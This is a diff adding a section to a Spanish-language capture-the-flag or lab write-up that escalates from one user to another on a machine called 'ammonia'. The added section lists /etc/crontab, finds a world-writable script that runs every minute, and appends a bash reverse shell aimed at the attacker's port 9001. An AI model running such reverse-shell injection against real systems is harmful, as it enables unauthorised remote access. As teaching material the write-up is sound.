@@ -309,6 +309,44 @@ Conexión al sistema a través de SSH utilizando las credenciales del usuario ha
 
 Obtención de acceso al usuario clara_immerwahr explotando la tarea cron que ejecuta el script /opt/scripts/backup_notes.sh con sus privilegios cada minuto. Al tener permisos de escritura en el script (777), se inyecta una reverse shell que se conecta al puerto 9001 de la máquina atacante, obteniendo así una shell interactiva con los permisos de clara_immerwahr cuando el cron ejecute el script modificado.
 
+Tras obtener acceso como haber_fritz, enumeramos las tareas cron del sistema revisando el archivo /etc/crontab.
+```bash
+haber_fritz@ammonia:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* *     * * *   clara_immerwahr /opt/scripts/backup_notes.sh
+```
+
+Detectamos que el usuario clara_immerwahr ejecuta de forma periódica el script /opt/scripts/backup_notes.sh.
+```bash
+haber_fritz@ammonia:~$ ls -l /opt/scripts/backup_notes.sh
+-rwxrwxrwx 1 root root 288 Jul 15 10:54 /opt/scripts/backup_notes.sh
+```
+Al verificar los privilegios del script con ls -l, descubrimos que cuenta con permisos de escritura globales (777).
+
+Sabiendo esto, aprovechamos nuestro acceso para inyectar una reverse shell apuntando a nuestra máquina atacante al final del script:
+
 ```bash
 nc -lvnp 9001 en kali
 haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/IP atacante/9001 0>&1" >> /opt/scripts/backup_notes.sh
